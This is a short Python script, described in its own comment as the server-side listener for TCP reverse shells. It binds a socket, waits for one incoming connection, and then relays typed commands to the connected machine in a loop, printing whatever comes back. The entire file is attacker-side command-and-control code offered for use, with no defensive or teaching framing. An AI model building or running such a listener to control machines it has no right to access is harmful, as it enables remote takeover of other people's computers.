# this is for making a server side listening client for TCP reverse shells

import socket

def connect(): # conneciton function 
        z = socket.socket() # making socket object
        z.bind(("127.0.0.1", 8081)) # IP to bind on. 
        z.listen(1) # only allow one session
        conn, addr = z.accept()
        print ("{+} we got a connection from" , addr)

        while True: # want to make a loop to keep the conneciton alive. 
                command = input("Shell> ")
                if 'terminate' in command: # break if terminate is in 
                    conn.send('terminate'.encode())
                    conn.close()
                    break
                else:
                    conn.send(command.encode())
                    print (conn.recv(1024).decode())

def main():
    connect()

main()
